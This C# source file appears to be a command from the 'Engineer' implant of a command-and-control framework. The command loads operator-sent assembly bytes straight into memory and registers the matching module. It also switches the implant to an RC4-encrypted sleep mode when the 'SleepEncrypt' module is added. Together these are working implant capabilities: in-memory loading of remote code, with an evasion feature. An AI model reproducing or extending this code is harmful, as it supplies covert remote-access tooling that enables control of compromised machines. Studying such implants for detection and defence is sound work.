using DynamicEngLoading;
using System;
using System.Collections.Generic;
using System.Configuration.Assemblies;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;

namespace Engineer.Commands
{
    internal class AddModule : EngineerCommand
    {
        public override string Name => "AddModule";

        public override async Task Execute(EngineerTask task)
        {
            try
            {
                task.Arguments.TryGetValue("/module", out string Module_name);
                if (String.IsNullOrEmpty(Module_name))
                {
                    ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("Error: no module name sent", task, EngTaskStatus.FailedWithWarnings, TaskResponseType.String);
                    return;
                }
                Module_name = Module_name.Trim();
                var assemblyBytes = task.File;
                if (assemblyBytes == null)
                {
                    ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("Error: no file sent", task, EngTaskStatus.FailedWithWarnings, TaskResponseType.String);
                }
                else
                {
                    // Load the assembly
                    var assembly = Assembly.Load(assemblyBytes);

                    // Get all types in the assembly
                    var types = assembly.GetTypes();

                    // Find the type that has the ModuleAttribute with the specified name
                    var targetType = types.FirstOrDefault(t => t.GetCustomAttribute(typeof(ModuleAttribute)) is ModuleAttribute attr && attr.Name.Equals(Module_name,StringComparison.CurrentCultureIgnoreCase));

                    if (targetType != null)
                    {
                        Program.typesWithModuleAttribute.Add(targetType);
                        if (Module_name.Equals("SleepEncrypt", StringComparison.CurrentCultureIgnoreCase))
                        {
                            Program.Sleeptype = Functions.SleepEnum.SleepTypes.Custom_RC4;
                        }
                        ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults($"Module {Module_name} added successfully", task, EngTaskStatus.Complete, TaskResponseType.String);
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex);
                Console.WriteLine(ex.StackTrace);
            }
            
        }
    }
}
